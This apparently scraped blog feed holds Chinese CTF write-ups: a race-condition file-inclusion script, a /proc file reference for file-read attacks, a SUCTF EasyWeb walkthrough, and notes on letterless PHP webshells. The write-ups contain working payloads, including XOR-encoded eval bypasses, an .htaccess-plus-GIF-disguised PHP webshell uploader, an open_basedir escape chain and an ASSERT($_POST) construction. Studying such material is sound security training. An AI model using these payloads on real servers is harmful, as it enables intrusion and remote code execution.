session.post('http://124.70.0.162:24693',data=data) print(resp.text) time.sleep(0.1) # if 'passwd' in resp.text: # print(resp.text) # break # event.clear() else: print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 需要注意的是 etc的目录需要一个个跑 ​```[0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.pwd.lock&quot; [3]=&gt; string(3) &quot;X11&quot; [4]=&gt; string(12) &quot;adduser.conf&quot; [5]=&gt; string(12) &quot;alternatives&quot; [6]=&gt; string(7) &quot;apache2&quot; [7]=&gt; string(10) &quot;apparmor.d&quot; [8]=&gt; string(3) &quot;apt&quot; [9]=&gt; string(11) &quot;bash.bashrc&quot; [10]=&gt; string(17) &quot;bash_completion.d&quot; [11]=&gt; string(22) &quot;bindresvport.blacklist&quot; [12]=&gt; string(8) &quot;binfmt.d&quot; [13]=&gt; string(15) &quot;ca-certificates&quot; [14]=&gt; string(20) &quot;ca-certificates.conf&quot; [15]=&gt; string(6) &quot;cron.d&quot; [16]=&gt; string(10) &quot;cron.daily&quot; [17]=&gt; string(11) &quot;cron.weekly&quot; [18]=&gt; string(6) &quot;dbus-1&quot; [19]=&gt; string(12) &quot;debconf.conf&quot; [20]=&gt; string(14) &quot;debian_version&quot; [21]=&gt; string(7) &quot;default&quot; [22]=&gt; string(12) &quot;deluser.conf&quot; [23]=&gt; string(4) &quot;dhcp&quot; [24]=&gt; string(4) &quot;dpkg&quot; [25]=&gt; string(11) &quot;environment&quot; [26]=&gt; string(5) &quot;fstab&quot; [27]=&gt; string(8) &quot;gai.conf&quot; [28]=&gt; string(10) &quot;gcbcgffhac&quot; [29]=&gt; string(5) &quot;group&quot; [30]=&gt; string(6) &quot;group-&quot; [31]=&gt; string(7) &quot;gshadow&quot; [32]=&gt; string(8) &quot;gshadow-&quot; [33]=&gt; string(9) &quot;host.conf&quot; [34]=&gt; string(8) &quot;hostname&quot; [35]=&gt; string(5) &quot;hosts&quot; [36]=&gt; string(4) &quot;init&quot; [37]=&gt; string(6) &quot;init.d&quot; [38]=&gt; string(7) &quot;inputrc&quot; [39]=&gt; string(7) &quot;insserv&quot; [40]=&gt; string(12) &quot;insserv.conf&quot; [41]=&gt; string(14) &quot;insserv.conf.d&quot; [42]=&gt; string(5) &quot;issue&quot; [43]=&gt; string(9) &quot;issue.net&quot; [44]=&gt; string(6) &quot;kernel&quot; [45]=&gt; string(11) &quot;ld.so.cache&quot; [46]=&gt; string(10) &quot;ld.so.conf&quot; [47]=&gt; string(12) &quot;ld.so.conf.d&quot; [48]=&gt; string(4) &quot;ldap&quot; [49]=&gt; string(5) &quot;legal&quot; [50]=&gt; string(13) &quot;libaudit.conf&quot; [51]=&gt; string(12) &quot;locale.alias&quot; [52]=&gt; string(10) &quot;locale.gen&quot; [53]=&gt; string(9) &quot;localtime&quot; [54]=&gt; string(8) &quot;logcheck&quot; [55]=&gt; string(10) &quot;login.defs&quot; [56]=&gt; string(11) &quot;logrotate.d&quot; [57]=&gt; string(11) &quot;lsb-release&quot; [58]=&gt; string(10) &quot;machine-id&quot; [59]=&gt; string(5) &quot;magic&quot; [60]=&gt; string(10) &quot;magic.mime&quot; [61]=&gt; string(7) &quot;mailcap&quot; [62]=&gt; string(13) &quot;mailcap.order&quot; [63]=&gt; string(10) &quot;mime.types&quot; [64]=&gt; string(11) &quot;mke2fs.conf&quot; [65]=&gt; string(14) &quot;modules-load.d&quot; [66]=&gt; string(4) &quot;mtab&quot; [67]=&gt; string(5) &quot;mysql&quot; [68]=&gt; string(8) &quot;networks&quot; [69]=&gt; string(13) &quot;nsswitch.conf&quot; [70]=&gt; string(3) &quot;opt&quot; [71]=&gt; string(10) &quot;os-release&quot; [72]=&gt; string(8) &quot;pam.conf&quot; [73]=&gt; string(5) &quot;pam.d&quot; [74]=&gt; string(6) &quot;passwd&quot; [75]=&gt; string(7) &quot;passwd-&quot; [76]=&gt; string(4) &quot;perl&quot; [77]=&gt; string(3) &quot;php&quot; [78]=&gt; string(7) &quot;profile&quot; [79]=&gt; string(9) &quot;profile.d&quot; [80]=&gt; string(9) &quot;python3.8&quot; [81]=&gt; string(8) &quot;rc.local&quot; [82]=&gt; string(5) &quot;rc0.d&quot; [83]=&gt; string(5) &quot;rc1.d&quot; [84]=&gt; string(5) &quot;rc2.d&quot; [85]=&gt; string(5) &quot;rc3.d&quot; [86]=&gt; string(5) &quot;rc4.d&quot; [87]=&gt; string(5) &quot;rc5.d&quot; [88]=&gt; string(5) &quot;rc6.d&quot; [89]=&gt; string(5) &quot;rcS.d&quot; [90]=&gt; string(11) &quot;resolv.conf&quot; [91]=&gt; string(3) &quot;rmt&quot; [92]=&gt; string(9) &quot;securetty&quot; [93]=&gt; string(8) &quot;security&quot; [94]=&gt; string(7) &quot;selinux&quot; [95]=&gt; string(6) &quot;shadow&quot; [96]=&gt; string(7) &quot;shadow-&quot; [97]=&gt; string(6) &quot;shells&quot; [98]=&gt; string(4) &quot;skel&quot; [99]=&gt; string(3) &quot;ssl&quot; [100]=&gt; string(6) &quot;subgid&quot; [101]=&gt; string(7) &quot;subgid-&quot; [102]=&gt; string(6) &quot;subuid&quot; [103]=&gt; string(7) &quot;subuid-&quot; [104]=&gt; string(11) &quot;sysctl.conf&quot; [105]=&gt; string(8) &quot;sysctl.d&quot; [106]=&gt; string(7) &quot;systemd&quot; [107]=&gt; string(8) &quot;terminfo&quot; [108]=&gt; string(8) &quot;timezone&quot; [109]=&gt; string(10) &quot;tmpfiles.d&quot; [110]=&gt; string(8) &quot;ucf.conf&quot; [111]=&gt; string(4) &quot;udev&quot; [112]=&gt; string(3) &quot;ufw&quot; [113]=&gt; string(13) &quot;update-motd.d&quot; [114]=&gt; string(3) &quot;vim&quot; [115]=&gt; string(6) &quot;wgetrc&quot; [116]=&gt; string(3) &quot;xdg&quot;}​```​``` [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;egdcbahfbh&quot;​```​```dedhfgiaai​```​``` [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;aeebhaaejd&quot;}​``` 获得如上目录，并在最后的一个目录下发现了fl44444g，然后直接文件包含即可","link":"/2021/05/25/CISCN-web/"},{"title":"CTF中linux重要文件目录小结（文件读取）","text":"最近发现读取目录也是需要积累的 所以在这里总结一下: /proc/[pid]/Linux 内核提供了一种通过 proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制。proc 文件系统是一个伪文件系统，它只存在内存当中，而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。 用户和应用程序可以通过 proc 得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取 proc 文件时，proc 文件系统是动态从系统内核读出所需信息并提交的。 下面列出的这些文件或子文件夹，并不是都是在你的系统中存在，这取决于你的内核配置和装载的模块。另外，在 proc 下还有三个很重要的目录：net，scsi 和 sys。 sys 目录是可写的，可以通过它来访问或修改内核的参数，而 net 和 scsi 则依赖于内核配置。例如，如果系统不支持 scsi，则 scsi 目录不存在。 除了以上介绍的这些，还有的是一些以数字命名的目录，它们是进程目录。系统中当前运行的每一个进程都有对应的一个目录在 proc 下，以进程的 PID 号为目录名，它们是读取进程信息的接口。而 self 目录则是读取进程本身的信息接口，是一个 link。 /proc/[pid]/auxv/proc/[pid]/auxv 包含传递给进程的 ELF 解释器信息，格式是每一项都是一个 unsigned long长度的 ID 加上一个 unsigned long 长度的值。最后一项以连续的两个 0x00 开头。举例如下： $ hexdump -x /proc/2406/auxv0000000 0021 0000 0000 0000 f000 f7fa 7fff 00000000010 0010 0000 0000 0000 fbff 1f8b 0000 00000000020 0006 0000 0000 0000 1000 0000 0000 00000000030 0011 0000 0000 0000 0064 0000 0000 00000000040 0003 0000 0000 0000 0040 0040 0000 00000000050 0004 0000 0000 0000 0038 0000 0000 00000000060 0005 0000 0000 0000 0007 0000 0000 00000000070 0007 0000 0000 0000 0000 0000 0000 00000000080 0008 0000 0000 0000 0000 0000 0000 00000000090 0009 0000 0000 0000 55e0 0045 0000 000000000a0 000b 0000 0000 0000 0000 0000 0000 000000000b0 000c 0000 0000 0000 0000 0000 0000 000000000c0 000d 0000 0000 0000 0000 0000 0000 000000000d0 000e 0000 0000 0000 0000 0000 0000 000000000e0 0017 0000 0000 0000 0000 0000 0000 000000000f0 0019 0000 0000 0000 f079 f7f6 7fff 00000000100 001f 0000 0000 0000 ffea f7f6 7fff 00000000110 000f 0000 0000 0000 f089 f7f6 7fff 00000000120 0000 0000 0000 0000 0000 0000 0000 00000000130 /proc/[pid]/cmdline/proc/[pid]/cmdline 是一个只读文件，包含进程的完整命令行信息。如果该进程已经被交换出内存或者这个进程是 zombie 进程，则这个文件没有任何内容。该文件以空字符 null 而不是换行符作为结束标志。举例如下： $ ps aux|grep frpsroot 2406 0.1 0.1 54880 10524 ? Sl Dec11 21:30 frps -c ./frps.ini$ cat /proc/2406/cmdlinefrps-c./frps.ini /proc/[pid]/comm/proc/[pid]/comm 包含进程的命令名。举例如下： $ cat /proc/2406/commfrps /proc/[pid]/cwd/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下： $ ls -lt /proc/2406/cwdlrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/cwd -&gt; /home/mike/frp_0.13.0_linux_amd64 /proc/[pid]/environ/proc/[pid]/environ 显示进程的环境变量。举例如下： $ strings /proc/2406/environSUPERVISOR_GROUP_NAME=sshTERM=linuxSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=sshRUNLEVEL=2UPSTART_EVENTS=runlevelPREVLEVEL=NPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binUPSTART_INSTANCE=UPSTART_JOB=rcSUPERVISOR_ENABLED=1runlevel=2PWD=/previous=N /proc/[pid]/exe/proc/[pid]/exe 为实际运行程序的符号链接。举例如下： $ ls -lt /proc/2406/exelrwxrwxrwx 1 root root 0 Dec 11 19:00 /proc/2406/exe -&gt; /usr/bin/frps /proc/[pid]/fd/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下： $ ls -lt /proc/2406/fdlrwx------ 1 root root 64 Dec 24 09:39 77 -&gt; socket:[44377722]lrwx------ 1 root root 64 Dec 17 15:07 47 -&gt; socket:[29482617]lr-x------ 1 root root 64 Dec 12 20:18 0 -&gt; pipe:[13282]l-wx------ 1 root root 64 Dec 12 20:18 1 -&gt; pipe:[13283]lrwx------ 1 root root 64 Dec 12 20:18 10 -&gt; socket:[12238218]lrwx------ 1 root root 64 Dec 12 20:18 4 -&gt; anon_inode:[eventpoll]lrwx------ 1 root root 64 Dec 12 20:18 40 -&gt; socket:[19378614] 目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。 /proc/[pid]/latency/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行： $ echo 1 &gt; /proc/sys/kernel/latencytop 举例如下 $ cat /proc/2406/latencyLatency Top version : v0.130667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc 每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。 /proc/[pid]/maps/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下： $ cat /proc/2406/maps00400000-006ea000 r-xp 00000000 fd:01 1727569 /usr/bin/frps006ea000-00a6c000 r--p 002ea000 fd:01 1727569 /usr/bin/frps00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569 /usr/bin/frps00ab1000-00ad4000 rw-p 00000000 00:00 0c000000000-c00000b000 rw-p 00000000 00:00 0c41feac000-c420000000 rw-p 00000000 00:00 0c420000000-c420400000 rw-p 00000000 00:00 0c420400000-c420700000 rw-p 00000000 00:00 0c420700000-c420800000 rw-p 00000000 00:00 0c420800000-c420900000 rw-p 00000000 00:00 0c420900000-c420a00000 rw-p 00000000 00:00 0c420a00000-c421ea0000 rw-p 00000000 00:00 0c421ea0000-c422a00000 rw-p 00000000 00:00 0c422a00000-c422a60000 rw-p 00000000 00:00 07f0418c01000-7f0418ee1000 rw-p 00000000 00:00 07ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0 [stack:5121]7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0 [vvar]7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] 其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。 /proc/[pid]/root/proc/[pid]/root 是进程根目录的符号链接。举例如下： $ ls -lt /proc/2406/rootlrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/root -&gt; / /proc/[pid]/stack/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下： $ cat /proc/2406/stack[&lt;ffffffff810fa996&gt;] futex_wait_queue_me+0xc6/0x130[&lt;ffffffff810fb05d&gt;] futex_wait+0x17d/0x270[&lt;ffffffff810fd2d5&gt;] do_futex+0xd5/0x520[&lt;ffffffff810fd791&gt;] SyS_futex+0x71/0x150[&lt;ffffffff8180cc76&gt;] entry_SYSCALL_64_fastpath+0x16/0x75[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff /proc/[pid]/statm/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下： $ cat /proc/2406/statm 13720 2617 493 746 0 12007 0 各个值含义： a）进程占用的总的内存b）进程当前时刻占用的物理内存c）同其它进程共享的内存d）进程的代码段e）共享库(从2.6版本起，这个值为0)f）进程的堆栈g）dirty pages(从2.6版本起，这个值为0) /proc/[pid]/status/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下： $ cat /proc/2406/statusName: frpsState: S (sleeping)Tgid: 2406Ngid: 0Pid: 2406PPid: 2130TracerPid: 0Uid: 0 0 0 0Gid: 0 0 0 0FDSize: 128Groups: 0NStgid: 2406NSpid: 2406NSpgid: 2406NSsid: 2130VmPeak: 54880 kBVmSize: 54880 kBVmLck: 0 kBVmPin: 0 kBVmHWM: 34872 kBVmRSS: 10468 kBVmData: 47896 kBVmStk: 132 kBVmExe: 2984 kBVmLib: 0 kBVmPTE: 68 kBVmPMD: 20 kBVmSwap: 0 kBHugetlbPages: 0 kBThreads: 11SigQ: 0/31834SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000000SigIgn: 0000000000000000SigCgt: fffffffe7fc1feffCapInh: 0000000000000000CapPrm: 0000003fffffffffCapEff: 0000003fffffffffCapBnd: 0000003fffffffffCapAmb: 0000000000000000Seccomp: 0Cpus_allowed: fCpus_allowed_list: 0-3Mems_allowed: 00000000,00000001Mems_allowed_list: 0voluntary_ctxt_switches: 2251028nonvoluntary_ctxt_switches: 18031 关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 Unix: Dealing with signals）。 /proc/[pid]/syscall/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下： $ cat /proc/2406/syscall202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3 第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。 内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。 /proc/[pid]/wchan/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下： $ cat /proc/2406/wchanfutex_wait_queue_meadmin proc/self我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。 所以我们可以通过self获取基于当前应用的不同信息 参考:https://www.hi-linux.com/posts/64295.htmlhttps://blog.csdn.net/dillanzhou/article/details/82876575","link":"/2021/05/28/CTF%E4%B8%ADlinux%E9%87%8D%E8%A6%81%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%B0%8F%E7%BB%93%EF%BC%88%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89/"},{"title":"buuctf18","text":"前言感觉最近有点小浮躁，必须要尽快调整~脚踏实地才是最重要的 [SUCTF 2019]EasyWeb&lt;?phpfunction get_the_flag(){ // webadmin will remove your upload file every 20 min!!!! $userdir = &quot;upload/tmp_&quot;.md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[&quot;file&quot;])){ $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); }}$hhh = @$_GET['_'];if (!$hhh){ highlight_file(__FILE__);}if(strlen($hhh)&gt;18){ die('One inch long, one inch strong!');}if ( preg_match('/[\\x00- 0-9A-Za-z\\'&quot;\\`~_&amp;.,|=[\\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);//不可以使用超过12种的字符if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt; 思路:执行eval函数，然后上传文件首先需要绕过那个正则匹配字母数字的，之前使用异或去取字符 import restr = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): print str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result print(&quot;\\n&quot;) 但是发现也有过滤一些特殊字符，所以这个方法不太行， https://my.oschina.net/u/4306654/blog/3363280用一下其他办法 import urllib.parsefind = ['G','E','t','_']for i in range(1,256): for j in range(1,256): result=chr(i^j) if(result in find): a= i.to_bytes(1,byteorder='big')#将十进制整数，转化为bytes(十六进制) b= j.to_bytes(1,byteorder='big') a= urllib.parse.quote(a)#进行URL编码 b= urllib.parse.quote(b) print(&quot;%s:%s^%s&quot;%(result,a,b)) 我们将范围扩大到很多不可见字符，这里就是使用ascii码了，然后为了防止被过滤，我就找了最下面的几个 t:%FE^%AA_:%FE^%A1G:%FE^%B9E:%FE^%BB 绕过18个字符就是用get再传参一次 first_payload for test: ${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=phpinfo${_GET}{%A1}()=$_GET(%A1) 这里有个很奇怪的点，就是这个t，别人跑出来都是AA我跑出来是8A=-=，所以payload一直不对，但是放到python里面去解析，去反编码回去，又是正确的?难道又是版本问题吗？ 总 总之，到这里就可以继续往下走了，接下来看源码，发现需要上传文件了看一下过滤吧： $userdir = &quot;upload/tmp_&quot;.md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir)){ mkdir($userdir); } if(!empty($_FILES[&quot;file&quot;])){ $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $extension = substr($name, strrpos($name,&quot;.&quot;)+1); if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die(&quot;^_^&quot;); if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); $path= $userdir.&quot;/&quot;.$name; @move_uploaded_file($tmp_name, $path); print_r($path); 1.检查后缀是否含有ph、检查内容是否含有&lt;?、检查是否为图片 文件上传思路由于过滤了ph后缀的文件，所以我们只能上传user.ini或者htaccess，这里显然上传htaccess更合适，因为可以用来将其他非php的文件解析为php，但是接下来会检查内容是否含有&lt;? 这里就是一个难点了，因为此时短标签绕过不了，想着使用&lt;script&gt;进行绕过，但是刚刚我们可以看到这个php版本为7.几的 这里有两种方法，一种是改变php的编码格式，另一种是以加密的形式传入，并解密读取接下来是绕过图片检查，这里使用的函数是exit_imagetype()**exif_imagetype()**读取图像的第一个字节并检查其签名。此时就很妨碍我们上传.htaccess了，这样就会不符合.htaccess的书写语法，导致无法解析.htaccess，那么我们该如何操作呢？这里说一下看完WP后的理解：要满足该函数的检查，首先会检查第一个字节，可以发现，第一个字节为空可以绕过检查，即/x00但是因为是图片检查，又需要定义其大小才会符合图片的定义（这里由于不了解exif_imagetype()的C代码运行逻辑，所以只能先猜测一下，待后面找到了再来补充，问了一下学长，确实是这样），接下来就是书写.htaccess的内容了，然后上传完.htaccess就上传我们的马，此时也需要加密一波再进行上传，头的检查和刚才的一样。 .htaccess文件内容构造首先解决第一个问题:没有上传窗口如何上传文件——使用Python的requests库上传文件https://blog.csdn.net/five3/article/details/74913742 import requestss=requests.session()conten_htacc=b&quot;&quot;&quot;#define width 1#define height 1AddType application/x-httpd-php .ggphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=tt.gg#这里就将其进行base64进行编码&quot;&quot;&quot;url=&quot;http://135d9802-5db9-41f2-8761-9eeb38a3ece9.node3.buuoj.cn?_=${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=get_the_flag&quot;files={ 'file':('.htaccess',conten_htacc,'image/png')}r=s.post(url,files=files)print(r.text) 根据这个获取文件夹所在位置upload/tmp_4f105b2c0ec2da14aae9b130ee13f8e9/.htaccess接下来是构造我们的图片马 import requestsimport base64s=requests.session()url=&quot;http://a199f759-9689-41ad-b7a7-c0bab6144be6.node3.buuoj.cn/?_=${%A1%B9%BB%AA^%FE%FE%FE%FE}{%A1}();&amp;%A1=get_the_flag&quot;content_hta=b&quot;&quot;&quot;#define width 1#define height 1AddType application/x-httpd-php .testphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_233e0752380798f15678fca34b470aea/1.test&quot;&quot;&quot;file1={ 'file':('.htaccess',content_hta,'image/jpeg')}r=s.post(url,files=file1).textprint(r)txt_content=b&quot;GIF89a&quot;+b&quot;aa&quot;+base64.b64encode(b&quot;&lt;?php @eval($_GET[cmd])?&gt;&quot;)file2={ 'file':('1.test',txt_content,'image/jpeg')}r=s.post(url,files=file2).textprint(r) 这边有个小细节 因为我们需要让php中的内容进行base64解码，但是前面又有个GIF98a不是base64编码内容，为了不让编码紊乱，base64的编码是将每三个字符转化为四个字符，那么解码的时候就会将原本的四个字符转化为三个字符，所以此时要多加两个字符，才不会影响到后面的马 没办法用蚁剑直接连接，推测是因为路径限制接下来我们要做的就是绕过open_basedir，进行文件的读取 https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/ https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/ 这篇文章有关于open_basedir绕过的底层详解看完以后我的理解是这样，ini_set open_basedir只是关注绝对路径和相对路径的拼接，其实是没有关注相对路径是会发生变化的 这里举个例子说明:假设我们的open_basedir为/var/www/html/ 我们位于/var/www/html/test 目录下，执行第一个ini_set后，首先判断/var/www/html/test/..即/var/www/html/是否为open_basedir内，判断成功，因此直接更新open_basedir为..chdir() 函数改变当前的目录。那么接下来我们执行chdir(‘..’) ..根据当前目录补全后为/var/www/html 而open_basedir补全以后也是var/www/html 同样满足，所以我们就可以这样一直跳转到根目录下 POC链： cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); 可以看到flag文件了 ?cmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g')); 小结感觉这道题真的收获很多，这边理一下：首先是思路:无字母数字如何getshell？——&gt;如何绕过文件上传限制——&gt;如何绕过open_basedir读取文件 收获知识点：1.无字母数字获取脚本编写2.PHP7特性下，变量解析的更新3.htaccess+文件包含绕过内容过滤以及exif_imagetype的bypass4.open_basedir+ini_set+chdir绕过open_basedir没有实践的点记录一下：exif_imagetype()以及open_basedir()+ini_set()函数的底层代码跳转过程 参考：https://mayi077.gitee.io/2020/02/14/SUCTF-2019-EasyWeb/https://www.cnblogs.com/20175211lyz/p/11488051.html https://www.jianshu.com/p/6f05923012d7 https://hexo.imagemlt.xyz/post/php-bypass-open-basedir/ https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/","link":"/2021/06/08/buuctf18/"},{"title":"不包含数字和字母的webshell","text":"前言已经做了两题有关无数字和字母的getshell，这里整理一下‘ 基础篇方法一：异或运算获得字符在PHP中，两个字符串进行异或操作以后，得到的还是一个字符串，原理很简单，直接贴脚本了： import restr = r&quot;!@#$%^*()+&lt;&gt;?;:-[]{}\\/&quot;# if re.match('[a-zA-Z0-9]+','a'):result=&quot;&quot;print(chr(ord('!')^ord('@')))for j in range(len(str)): for i in range(len(str)): result=chr(ord(str[j])^ord(str[i])) # print(result) if re.match('[a-zA-Z0-9]+',result): # if result=='_': print(str[j]+&quot;^&quot;+str[i]+&quot;=&quot;+result) 同类型的还有一个取反 方法二：++特性取字符 &lt;?php$_=[];$_=@&quot;$_&quot;; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html 提高篇长度限制+不包含$和_php7中关于变量处理的变化1.解析顺序 对变量、属性和方法的间接调用现在将严格遵循从左到右的顺序来解析 2.执行动态函数方法PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过('phpinfo')();来执行函数，第一个括号中可以是任意PHP表达式。 payload： (~%8F%97%8F%96%91%99%90)(); //(phpinfo)() PHP5中如何执行方法思维导入大部分语言都不是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互，操作系统里面包含最重要的两个功能就是shell(系统命令)和文件系统。 PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？ 这里有个知识点需要了解一下，在linux系统中，许多系统命令都是有自己的脚本文件在，我们可以通过调用这些脚本文件来执行shell命令，这也就是之前所说的linux系统中，一切皆文件的思想，即使用bash执行file文件中的命令 介绍两个shell知识点:1、shell可以用.来执行任意脚本，并且不需要file有x权限2、linux文件名支持用glob通配符代替 思路上传bash文件——执行文件 问题一：没有上传窗口文件该如何上传？ 使用脚本 import requestsfiles={ 'file':open('1.txt',rb)}url=&quot;&quot;response=requests.get(url,files=files)print(reponse.txt) 利用脚本post直接上传 问题二：不能用字母数字，如何选中所要执行的文件？ 